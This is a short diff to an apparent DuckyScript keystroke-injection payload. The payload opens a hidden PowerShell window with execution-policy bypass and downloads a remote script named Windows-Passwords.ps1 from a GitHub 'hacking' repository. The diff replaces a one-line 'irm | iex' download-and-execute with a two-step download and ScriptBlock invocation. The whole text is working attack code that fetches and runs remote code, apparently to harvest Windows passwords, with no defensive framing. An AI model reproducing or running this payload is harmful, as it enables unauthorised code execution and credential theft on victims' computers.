@@ -17,4 +17,6 @@ DELAY 250
 STRING powershell -w h -ep bypass 
 REM Provide payload
 DEFINE PAYLOAD https://raw.githubusercontent.com/javirufo-ies/hacking/main/Windows-Passwords.ps1
-STRINGLN 'irm PAYLOAD | iex'
+STRINGLN $code = irm PAYLOAD -UseBasicParsing
+STRINGLN [ScriptBlock]::Create($code).Invoke()
+REM STRINGLN 'irm PAYLOAD | iex'
